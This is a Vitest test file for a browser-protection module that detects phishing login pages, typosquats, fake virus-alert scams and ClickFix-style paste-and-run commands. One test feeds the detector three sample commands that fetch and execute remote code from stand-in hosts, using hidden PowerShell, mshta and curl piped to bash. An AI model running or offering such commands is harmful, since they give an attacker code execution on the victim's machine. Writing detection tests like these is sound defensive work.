import { describe, expect, it } from 'vitest'

import {
  assessPage,
  assessScamText,
  looksLikeShellCommand,
  registrableDomain,
} from '@/core/protection/heuristics'

describe('protection heuristics', () => {
  it('computes registrable domains with multi-part suffixes', () => {
    expect(registrableDomain('www.shop.example.co.uk')).toBe('example.co.uk')
    expect(registrableDomain('mail.google.com')).toBe('google.com')
  })

  it('flags brand impersonation on password pages', () => {
    const verdict = assessPage({
      host: 'paypal-secure-login.xyz',
      protocol: 'https:',
      hasPassword: true,
      formActions: [],
      title: 'Sign in',
    })
    expect(verdict.level).toBe('high')
    expect(verdict.brand).toBe('paypal')
  })

  it('does not flag official domains', () => {
    const verdict = assessPage({
      host: 'www.paypal.com',
      protocol: 'https:',
      hasPassword: true,
      formActions: [],
      title: 'Log in to PayPal',
    })
    expect(verdict.level).toBe('none')
  })

  it('returns none without a password field', () => {
    expect(
      assessPage({
        host: 'paypal.evil.test',
        protocol: 'https:',
        hasPassword: false,
        formActions: [],
        title: '',
      }).level,
    ).toBe('none')
  })

  it.each([
    ['eportal.incometax.gov.in', 'Income Tax Portal'],
    ['login.microsoftonline.com', 'Sign in to Microsoft'],
    ['login.microsoftonline.com', 'Sign in to Office'],
    ['login.microsoftonline.com', 'Sign in to Outlook'],
    ['www.icloud.com', 'Sign in to Apple'],
    ['metabolic.example', 'Account login'],
    ['accounts.example', 'Metabolic research portal'],
  ])('does not flag legitimate password pages at %s titled %s', (host, title) => {
    expect(assessPage({ host, title, protocol: 'https:', hasPassword: true, formActions: [] }))
      .toEqual({ level: 'none' })
  })

  it.each([
    'paypal.evil.test', 'meta-login.example', 'login.microsoftonline.com.evil.test',
    'login.microsoftonline.com.evil.co.in', 'microsoftonline-login.example',
  ])
    ('still flags deceptive login hosts at %s', (host) => {
      expect(assessPage({
        host, title: 'Sign in', protocol: 'https:', hasPassword: true, formActions: [],
      }).level).toBe('high')
    })

  it.each([
    ['http:', [], 'http_password'],
    ['https:', ['https://unrelated.example/submit'], 'cross_domain_form'],
  ] as const)('retains %s credential warnings on official hosts', (protocol, formActions, reason) => {
    expect(assessPage({
      host: 'login.microsoftonline.com', title: 'Microsoft', protocol,
      hasPassword: true, formActions: [...formActions],
    })).toEqual({ level: 'low', reason })
  })

  it('flags fake virus alerts with a support number', () => {
    const text = `WINDOWS DEFENDER SECURITY WARNING
      Access to this PC has been blocked for security reasons.
      Your computer has been locked. Trojan spyware detected.
      Call Microsoft Support: +1 (844) 555-0199 (toll free)`
    expect(assessScamText('secure-alert.example', 'Security Warning', text).level).toBe('high')
  })

  it('does not flag scam wording on vendor domains or ordinary articles', () => {
    const text =
      'Windows Defender security warning: access to this PC has been blocked. Call Microsoft support +1 844 555 0199'
    expect(assessScamText('support.microsoft.com', '', text).level).toBe('none')
    expect(
      assessScamText('news.example', 'How to avoid tech support scams', 'Never call a number shown in a pop-up.').level,
    ).toBe('none')
  })

  it('recognises ClickFix-style shell commands', () => {
    expect(looksLikeShellCommand('powershell -w hidden -c "iex(iwr http://x.test/a)"')).toBe(true)
    expect(looksLikeShellCommand('mshta https://evil.test/verify.hta # I am not a robot')).toBe(true)
    expect(looksLikeShellCommand('curl -fsSL https://x.test/i.sh | bash')).toBe(true)
    expect(looksLikeShellCommand('Order #A12345 confirmed')).toBe(false)
    expect(looksLikeShellCommand('npm install react')).toBe(false)
  })

  it('flags typosquats within edit distance 1', () => {
    const verdict = assessPage({
      host: 'paypa1.com',
      protocol: 'https:',
      hasPassword: true,
      formActions: [],
      title: '',
    })
    expect(verdict.level).toBe('high')
  })
})
